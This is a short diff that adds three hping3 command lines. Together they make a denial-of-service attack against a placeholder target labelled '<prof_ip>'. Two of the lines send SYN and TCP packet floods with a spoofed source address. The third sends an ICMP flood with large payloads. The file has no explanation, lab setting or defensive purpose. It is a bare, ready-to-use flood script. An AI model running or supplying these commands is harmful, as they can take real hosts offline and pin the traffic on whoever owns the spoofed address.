@@ -1,0 +1,5 @@
+hping3 -c 10000 -S -a 77.217.249.117 -p <port> <prof_ip>
+
+hping3 -c 9000 -d 100 -i u90 -a 77.217.249.117 -p <port> <prof_ip>
+
+hping3 -c 11000 --icmp --data 1024 -i u75 <prof_ip>
